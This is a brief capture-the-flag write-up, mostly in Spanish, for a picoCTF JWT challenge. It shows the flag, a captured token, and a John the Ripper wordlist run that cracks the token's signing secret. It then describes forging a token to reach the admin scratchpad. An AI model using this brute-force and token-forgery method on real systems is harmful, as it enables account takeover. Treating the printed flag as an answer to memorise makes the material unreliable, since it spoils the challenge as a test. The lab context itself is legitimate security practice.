# DESCRIPCIÓN:
Check the admin scratchpad!

Hints:   
- What is that cookie?
- Have you heard of JWT?
# SOLUCIÓN:
#### picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

```

┌──(mony㉿Mony)-[~]
└─$ nano jwt

┌──(mony㉿Mony)-[~]
└─$ cat jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibW9ueSJ9.RU0A_uiDvAdlyVYyYTU6XgvZzO6xAaTF5SvEtXg_AQg

┌──(mony㉿Mony)-[~]
└─$ john jwt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:02 DONE (2026-09-15 01:07) 0.3436g/s 2542Kp/s 2542Kc/s 2542KC/s ilovetitor..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```
Una vez generada la pista, desciframos el nuevo token con la página, cambiando el user y sustituyendo con ilovepico, para después ingresarlo en nuestro scratchpad de JWT.
![[Pasted image 20260915011302.png]]
![[Pasted image 20260915011150.png]]
# NOTAS ADICIONALES:

# REFERENCIAS:
http://fickle-tempest.picoctf.net:52913/
https://webshell.cylabacademy.org/